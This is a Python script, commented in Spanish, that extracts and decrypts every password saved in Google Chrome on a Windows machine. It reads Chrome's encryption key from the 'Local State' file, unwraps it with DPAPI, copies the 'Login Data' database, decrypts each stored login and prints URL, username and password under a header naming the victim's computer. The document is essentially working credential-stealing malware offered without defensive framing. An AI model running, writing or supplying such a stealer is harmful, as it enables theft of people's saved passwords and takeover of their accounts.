import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES  
import shutil
import sys

def get_chrome_encryption_key():
    """Obtiene la clave de cifrado AES de Chrome almacenada en el sistema"""
    # Ruta al archivo de "Local State" donde Chrome almacena la clave
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
    
    # Leer el contenido del archivo "Local State"
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state_data = json.loads(file.read())
    
    # Extraer la clave cifrada del archivo "Local State"
    encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
    
    # La clave real empieza después del prefijo 'DPAPI' (los primeros 5 bytes)
    encrypted_key = encrypted_key[5:]
    
    # Usar CryptUnprotectData para descifrar la clave
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    return decrypted_key

def decrypt_password(password, key):
    """Descifra la contraseña usando la clave AES"""
    try:
        # Elimina el prefijo 'v10' de las contraseñas cifradas
        iv = password[3:15]
        password = password[15:]
        
        # Usar AES para descifrar
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()  # Eliminar el relleno
        return decrypted_password
    except Exception as e:
        print(f'Error al descifrar la contraseña: {e}')
        return ""

def main():
    # Ruta al archivo de base de datos de Chrome
    db_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\Login Data")
    result = f'=== Extracted from {os.environ["USERNAME"]} computer ===\n'

    if os.path.exists(db_path):
        try:
            # Hacer una copia del archivo de base de datos
            shutil.copy(db_path, './database')
            connection = sqlite3.connect('./database')
            cursor = connection.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            
            # Obtener la clave de cifrado AES
            encryption_key = get_chrome_encryption_key()
            
            for row in cursor.fetchall():
                action_url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Descifrar la contraseña
                decrypted_password = decrypt_password(encrypted_password, encryption_key)
                
                if username or decrypted_password:
                    result += f'URL: {action_url}\nUsername: {username}\nPassword: {decrypted_password}\n\n'
            
            connection.close()
            os.remove('./database')
        
        except Exception as e:
            result = f'[-] Error: {e}'
    else:
        result = '[!] Google Chrome is not installed!'
    
    # Guardar los resultados en un archivo de texto
    print(result)

if __name__ == '__main__':
    main()
